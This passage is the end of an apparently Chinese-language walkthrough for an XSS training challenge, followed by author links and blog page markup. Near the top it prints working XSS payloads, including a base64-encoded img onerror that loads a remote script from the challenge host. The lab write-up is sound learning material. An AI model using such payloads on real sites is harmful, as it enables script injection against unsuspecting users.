+<p> open(“javascript:name”,”img src&#x3D;x onerror&#x3D;alert(domain.domain)&gt;”) &#x2F;&#x2F;请忽略浏览器拦截</p>
+<p>这里需要复习一下 js 模板的方法调用</p>
+<p>aa<code>aaa$&#123;1&#125;bbb$&#123;2&#125;ccc</code> </p>
+<p>相当于就是,传递了三个参数</p>
+<p>[“aaa,bbb,ccc”, “1”, “2”] </p>
+<p>因此我们可以构造 </p>
+<p>open<code>javascript:name//$&#123;atob</code>PGltZyBzcmM9eCBvbmVycm9yPXdpdGgob3BlbmVyLmRvY3VtZW 50KWJvZHkuYXBwZW5kQ2hpbGQoY3JlYXRlRWxlbWVudCgnc2NyaXB0JykpLnNyYz0naHR0cDovL3hjY W8udmlwL3hzcy9hbGVydC5qcyc+<code>&#125;</code> </p>
+<p>构造payload</p>
+<p><a target="_blank" rel="noopener" href="http://xcao.vip//test/xss8-2.php?data=open%60javascript:name//$%7Batob%60PGltZyBzcmM9">http://xcao.vip//test/xss8-2.php?data=open`javascript:name//${atob`PGltZyBzcmM9</a> eCBvbmVycm9yPXdpdGgob3BlbmVyLmRvY3VtZW50KWJvZHkuYXBwZW5kQ2hpbGQoY3JlYXRlRWxlbWV udCgnc2NyaXB0JykpLnNyYz0naHR0cDovL3hjYW8udmlwL3hzcy9hbGVydC5qcyc%2b<code>&#125;</code></p>
+<p>成功通关</p>
+<p><img src="https://img-blog.csdnimg.cn/2cf469448a21415b98fb98969647b999.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>文笔生疏，措辞浅薄，望各位大佬不吝赐教，万分感谢。</p>
+<p>免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。</p>
+<p>转载声明：儒道易行 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。</p>
+<p>博客:</p>
+<p><a href="https://rdyx0.github.io/">https://rdyx0.github.io/</a></p>
+<p>先知社区：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/u/37846">https://xz.aliyun.com/u/37846</a> </p>
+<p>CSDN:</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_48899364?type=blog">https://blog.csdn.net/weixin_48899364?type&#x3D;blog</a></p>
+<p>公众号：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg5NTU2NjA1Mw==&action=getalbum&album_id=1696286248027357190&scene=173&from_msgid=2247485408&from_itemidx=1&count=3&nolastread=1#wechat_redirect">https://mp.weixin.qq.com/mp/appmsgalbum?__biz&#x3D;Mzg5NTU2NjA1Mw&#x3D;&#x3D;&amp;action&#x3D;getalbum&amp;album_id&#x3D;1696286248027357190&amp;scene&#x3D;173&amp;from_msgid&#x3D;2247485408&amp;from_itemidx&#x3D;1&amp;count&#x3D;3&amp;nolastread&#x3D;1#wechat_redirect</a></p>
+<p>FreeBuf：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/author/%E5%9B%BD%E6%9C%8D%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E6%8E%8C%E6%8E%A7%E8%80%85">https://www.freebuf.com/author/%E5%9B%BD%E6%9C%8D%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E6%8E%8C%E6%8E%A7%E8%80%85</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>独孤九剑xss通关教程</div>
+      <div>http://rdyx0.github.io/2019/10/23/独孤九剑xss通关教程/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>儒道易行</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2019年10月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/10/24/Webug4.0%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" title="Webug4.0靶场通关">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Webug4.0靶场通关</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/10/22/XSS%20Game%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" title="XSS Game通关教程">
+                        <span class="hidden-mobile">XSS Game通关教程</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/rdyx0" target="_blank" rel="nofollow noopener"><span>儒道易行</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
